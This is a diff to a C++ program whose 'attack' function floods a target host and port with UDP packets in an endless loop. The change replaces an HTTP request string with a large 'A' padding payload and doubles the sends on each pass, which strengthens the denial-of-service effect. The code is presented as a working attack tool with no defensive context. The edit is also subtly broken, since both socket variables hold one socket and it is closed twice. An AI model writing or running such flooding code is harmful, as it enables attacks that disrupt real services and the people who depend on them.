@@ -1,4 +1,4 @@
-﻿#include<cstdio>
+#include<cstdio>
 #include<cstdlib>
 #include<cstring>
 #include<netdb.h>
@@ -11,11 +11,15 @@
 
 #include <thread>
 
-const char data[] = "GET / HTTP/1.0\r\n\r\n";
+const char data[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";//"GET / HTTP / 1.0\r\n\r\n";
 
 void attack(char* str, int port)
 {
-    int soc;
+    int soc, soc2;
     struct sockaddr_in addr;
 
     addr.sin_family = AF_INET;
@@ -28,13 +32,15 @@ void attack(char* str, int port)
     while (true) {
         try {
             //ソケット生成
-            soc = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
+            soc = soc2 = (*F_sock)(AF_INET, SOCK_DGRAM, 0);
 
             //データ送信
             sendto(soc, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
+            sendto(soc2, data, sizeof(data), 0, (struct sockaddr*)&addr, sizeof(addr));
 
             //ソケットを閉じる
             (*F_close)(soc);
+            (*F_close)(soc2);
         }
         catch (...) {
             perror("Error ");
